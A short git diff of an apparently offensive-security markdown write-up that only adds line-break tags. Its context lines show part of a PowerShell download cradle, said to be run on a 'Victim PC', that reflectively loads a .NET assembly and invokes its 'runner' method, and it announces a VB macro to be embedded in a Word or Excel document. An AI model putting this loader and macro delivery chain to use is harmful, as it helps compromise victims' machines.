@@ -98,8 +98,8 @@ namespace ClassLibrary1
 }
 ```
 
-
 <br>
+<br/>
 This run.ps1 is a lightly modified download cradle to be downloaded and run by the Victim PC 
 
 ```powershell
@@ -109,7 +109,8 @@ $class = $assem.GetType("ClassLibrary1.Class1")
 $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
 ```
-
+<br>
+<br>
 This VB macro would be embeded in the Word/Excel Document
 
 ```vb
